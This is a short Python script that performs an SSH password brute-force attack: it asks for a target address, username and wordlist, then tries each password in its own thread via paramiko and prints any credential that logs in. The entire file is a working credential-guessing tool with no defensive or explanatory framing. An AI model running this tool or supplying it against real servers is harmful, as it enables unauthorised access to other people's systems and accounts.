import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password): #Connection Config
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[->] Password Found for ' + username + ':' + password), 'green'))
    except:
        print(termcolor.colored(('[T.T] Incorrect Login: ' + password), 'red'))

    ssh.close()

host = input('[->] Target Address: ')
username = input('[->] SSH Username: ')
input_file = input('[->] Passwords File: ')

if os.path.exists(input_file) == False:
    print('[T.T] File/Path does not exist')
    sys.exit(1)

print('SSh BruteForce on ' + host + ' with account : ' + username + 'is in progress ;)')

with open(input_file, 'r') as file:  #Checks for Password
    for line in file.readlines():
        if stop_flag ==  1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
